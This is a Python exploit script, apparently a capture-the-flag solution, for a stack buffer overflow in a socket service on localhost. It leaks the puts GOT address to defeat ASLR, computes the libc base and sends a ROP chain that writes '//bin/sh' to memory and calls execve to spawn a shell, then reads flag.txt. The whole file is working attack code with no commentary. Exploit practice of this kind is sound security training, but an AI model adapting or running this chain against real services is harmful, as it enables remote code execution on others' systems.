from struct import pack
import socket
import sys

p = lambda x : pack('Q', x)
host = "localhost"
port = 10000
# obtained with:
# ropper -f /lib/x86_64-linux-gnu/libc.so.6 --chain "execve cmd=/bin/sh"

def get_got(got):
	pop_rdi		= p(0x401853)
	pop_rsi_r15	= p(0x401851)
	write		= p(0x4011b4)

	o = b'A'*1032
	o += pop_rdi
	o += p(1) 
	o += pop_rsi_r15
	o += got 					  		
	o += p(0xdeadbeefdeadbeef)
	o += write
	o += b"C"*(4096-len(o))

	s = socket.create_connection((host, port))
	s.send(b"w" + o + b"q")
	g = s.recv(8)
	s.close()
	return g

def rop_chain(libc):

	rebase_0 = lambda x : p(x + libc)

	rop =  b'A'*1032
	rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
	rop += b'//bin/sh'
	rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
	rop += rebase_0(0x00000000001eb1a0)
	rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
	rop += p(0x0000000000000000)
	rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x0000000000026b72) # 0x0000000000026b72: pop rdi; ret; 
	rop += rebase_0(0x00000000001eb1a0)
	rop += rebase_0(0x0000000000027529) # 0x0000000000027529: pop rsi; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += rebase_0(0x000000000011c371) # 0x000000000011c371: pop rdx; pop r12; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x000000000004a550) # 0x000000000004a550: pop rax; ret; 
	rop += p(0x000000000000003b)
	rop += rebase_0(0x0000000000066229) # 0x0000000000066229: syscall; ret; 
	rop += b"C"*(4096 - len(rop))
	return rop

def main():
	got = 0x403f40
	puts = b""
	for i in range(0, 8):
		puts += get_got(p(got + i))
	puts = int.from_bytes(puts, 'little')
	libc = puts - 0x875a0 # puts offset in libc obtained with nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<puts\>'

	s = socket.create_connection((host, port))
	s.send(b"w" + rop_chain(libc) + b"q")
	s.send(b"cat flag.txt\n")
	print(s.recv(256))
	s.close()
	
if __name__ == '__main__':
	main()